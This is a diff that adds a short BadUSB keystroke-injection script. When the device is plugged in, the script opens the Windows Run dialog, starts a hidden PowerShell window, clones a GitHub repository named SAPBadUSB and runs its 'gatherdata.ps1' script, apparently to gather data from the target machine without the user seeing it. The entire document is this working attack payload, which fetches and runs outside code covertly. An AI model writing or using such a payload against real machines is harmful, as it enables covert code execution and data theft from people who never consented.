@@ -1,0 +1,6 @@
+REM *** Start powershell ***
+GUI r
+DELAY 1000
+STRING powershell -WindowStyle hidden -command "git clone https://github.com/JonathanStross/SAPBadUSB; .\SAPBadUSB\ps\gatherdata.ps1 "
+DELAY 1000
+ENTER
